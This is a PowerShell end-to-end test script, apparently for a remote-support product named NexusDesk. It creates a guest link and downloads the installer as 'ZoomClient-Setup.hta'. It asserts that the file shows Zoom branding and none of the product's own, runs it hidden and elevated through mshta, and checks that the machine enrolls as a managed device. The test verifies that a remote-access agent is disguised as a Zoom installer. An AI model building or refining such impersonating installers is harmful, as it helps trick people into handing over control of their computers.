# Windows guest installer E2E — download .hta, run via mshta, verify device enrolls.
# Used by .github/workflows/windows-installer-e2e.yml (GitHub Actions windows-latest).
param(
  [string]$ApiUrl = $(if ($env:API_URL) { $env:API_URL } else { 'http://127.0.0.1:4000' }),
  [string]$AdminEmail = $(if ($env:SEED_ADMIN_EMAIL) { $env:SEED_ADMIN_EMAIL } else { 'admin@nexusdesk.com' }),
  [string]$AdminPassword = $env:SEED_ADMIN_PASSWORD,
  [int]$InstallTimeoutSec = 900,
  [int]$DeviceWaitSec = 180
)

$ErrorActionPreference = 'Stop'

function Write-Step([string]$Message) {
  Write-Host "==> $Message"
}

function Wait-ApiReady {
  param([string]$BaseUrl, [int]$MaxSec = 120)
  $deadline = (Get-Date).AddSeconds($MaxSec)
  while ((Get-Date) -lt $deadline) {
    try {
      $health = Invoke-RestMethod -Uri "$BaseUrl/health" -TimeoutSec 5
      if ($health.status -eq 'ok') { return }
    } catch {}
    Start-Sleep -Seconds 2
  }
  throw "API not ready at $BaseUrl after ${MaxSec}s"
}

function Invoke-ApiJson {
  param(
    [string]$Method,
    [string]$Uri,
    [hashtable]$Headers = @{},
    [object]$Body = $null
  )
  $params = @{
    Method      = $Method
    Uri         = $Uri
    Headers     = $Headers
    ContentType = 'application/json'
  }
  if ($null -ne $Body) {
    $params.Body = ($Body | ConvertTo-Json -Depth 6)
  }
  return Invoke-RestMethod @params
}

if (-not $AdminPassword) {
  throw 'SEED_ADMIN_PASSWORD is required'
}

Write-Step "Waiting for API at $ApiUrl"
Wait-ApiReady -BaseUrl $ApiUrl

Write-Step 'Logging in as seed admin'
$login = Invoke-ApiJson -Method Post -Uri "$ApiUrl/auth/login" -Body @{
  email    = $AdminEmail
  password = $AdminPassword
}
$token = $login.accessToken
if (-not $token) { throw 'Login failed — no accessToken' }

$headers = @{ Authorization = "Bearer $token" }
$me = Invoke-ApiJson -Method Get -Uri "$ApiUrl/auth/me" -Headers $headers
$orgId = $me.organizationId
if (-not $orgId -and $me.organizations) {
  $orgId = $me.organizations[0].id
}
if (-not $orgId) { throw 'Could not resolve organization id from /auth/me' }

Write-Step 'Creating guest support link'
$created = Invoke-ApiJson -Method Post -Uri "$ApiUrl/organizations/$orgId/guest-links" -Headers $headers -Body @{
  inviteTemplate = 'zoom'
  maxUses        = 5
  ttl            = '24h'
}
$code = $created.link.code
if (-not $code) { throw 'Guest link creation failed' }
Write-Step "Guest code: $code"

$htaUrl = "$ApiUrl/guest/$code/setup.hta?v=23"
$htaPath = Join-Path $env:TEMP "ZoomClient-Setup.hta"

Write-Step "Downloading installer: $htaUrl"
Invoke-WebRequest -Uri $htaUrl -OutFile $htaPath -UseBasicParsing
if (-not (Test-Path $htaPath)) { throw 'HTA download failed' }
$htaSize = (Get-Item $htaPath).Length
if ($htaSize -lt 500) { throw "HTA file too small ($htaSize bytes)" }

$htaText = Get-Content -LiteralPath $htaPath -Raw
if ($htaText -notmatch 'Zoom') { throw 'HTA missing Zoom branding' }
if ($htaText -match 'NexusDesk Support') { throw 'HTA still contains NexusDesk guest branding' }
Write-Step "HTA downloaded ($htaSize bytes)"

Write-Step 'Running installer via mshta (elevated auto-start)'
$mshta = Join-Path $env:SystemRoot 'System32\mshta.exe'
if (-not (Test-Path $mshta)) { throw 'mshta.exe not found' }

$htaArg = "`"$htaPath`" elevated"
$proc = Start-Process -FilePath $mshta -ArgumentList $htaArg -PassThru -WindowStyle Hidden
$installDeadline = (Get-Date).AddSeconds($InstallTimeoutSec)
while (-not $proc.HasExited -and (Get-Date) -lt $installDeadline) {
  Start-Sleep -Seconds 3
}
if (-not $proc.HasExited) {
  try { $proc.Kill() } catch {}
  throw "Installer did not finish within ${InstallTimeoutSec}s"
}
if ($proc.ExitCode -and $proc.ExitCode -ne 0) {
  throw "mshta exited with code $($proc.ExitCode)"
}
Write-Step 'Installer process finished'

Write-Step 'Waiting for enrolled device in dashboard'
$deviceDeadline = (Get-Date).AddSeconds($DeviceWaitSec)
$found = $false
while ((Get-Date) -lt $deviceDeadline) {
  $page = Invoke-ApiJson -Method Get -Uri "$ApiUrl/organizations/$orgId/devices" -Headers $headers
  $list = @($page.items)
  if (-not $list -and $page -is [array]) { $list = @($page) }
  $match = $list | Where-Object {
    $_.status -in @('online', 'pending', 'offline') -and $_.platform -eq 'windows'
  } | Select-Object -First 1
  if ($match) {
    Write-Step "Device enrolled: id=$($match.id) status=$($match.status) name=$($match.name)"
    $found = $true
    break
  }
  Start-Sleep -Seconds 5
}

if (-not $found) {
  $log = Join-Path $env:ProgramData 'NexusDesk\Agent\install.log'
  $agentLog = Join-Path $env:ProgramData 'NexusDesk\Agent\agent.log'
  if (Test-Path $log) {
    Write-Host '--- install.log (tail) ---'
    Get-Content $log -Tail 40
  }
  if (Test-Path $agentLog) {
    Write-Host '--- agent.log (tail) ---'
    Get-Content $agentLog -Tail 40
  }
  throw 'No Windows device appeared after install'
}

Write-Step 'WINDOWS INSTALLER E2E PASSED'
